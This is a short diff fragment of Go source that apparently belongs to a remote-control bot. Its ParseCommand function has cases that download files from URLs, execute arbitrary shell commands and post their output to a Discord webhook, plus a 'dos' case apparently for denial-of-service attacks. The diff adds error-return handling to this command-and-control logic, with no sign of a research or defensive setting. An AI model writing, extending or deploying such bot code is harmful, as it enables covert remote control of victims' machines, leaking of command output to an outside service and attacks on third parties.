@@ -382,8 +382,10 @@ func ParseCommand(command string) error {
 				status := " Success"
 				if err != nil {
 					status = fmt.Sprintf(" Failed: %v", err)
+					return err
 				}
 				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Download `%s` from `%s`\nStatus: `%s`", filename, url, status))
+				return nil
 			}
 		case "cmd":
 			if len(parts) > 1 {
@@ -391,8 +393,10 @@ func ParseCommand(command string) error {
 				status := " Success"
 				if err != nil {
 					status = fmt.Sprintf(" Error: %v", err)
+					return err
 				}
 				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Command `%s` executed\nOutput:\n```\n%s\n```Status: `%s`", strings.Join(parts[1:], " "), output, status))
+				return nil
 			}
 		case "dos":
 			if len(parts) < 4 {
